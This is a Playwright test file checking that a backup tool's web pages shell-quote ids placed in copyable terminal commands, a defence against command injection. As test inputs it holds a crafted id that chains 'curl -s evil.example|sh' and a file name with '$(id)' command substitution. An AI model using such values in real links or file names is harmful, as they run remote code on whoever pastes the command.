/**
 * Issue #1253's review: two terminal lines the browser prints with an id
 * left unquoted, driven on the screens that print them.
 *
 * The Operation page takes its id from the address, so a crafted link put
 * `retnd assurance show x; curl ...|sh` under "Read it from the terminal",
 * which is a panel people copy from. The Backups selection bar printed the
 * selected backups' ids unquoted before a destination was chosen, and an
 * artifact id ends in a file name collected from the source host.
 */
import { expect, test } from "@playwright/test";
import { open } from "./helpers";

test("1253: an operation id from a crafted link is quoted on the Operation page", async ({ page }) => {
  const id = "x; curl -s evil.example|sh";
  await open(page, "/assurance/operations/" + encodeURIComponent(id));
  const lines = page.getByTestId("operation-page").locator("code");
  await expect(lines.first()).toHaveText("retnd assurance show 'x; curl -s evil.example|sh'");
});

test("1253: the selection bar quotes a backup id before a destination is chosen", async ({ page }) => {
  await open(page, "/backups", "backups-hostile-filename");
  await page.getByRole("checkbox", { name: "Select prod $(id).dump.zst", exact: true }).check();
  await expect(page.getByTestId("recover-command")).toHaveText(
    "retnd recover 'production/postgres-primary/prod $(id).dump.zst' --to <destination>"
  );
});
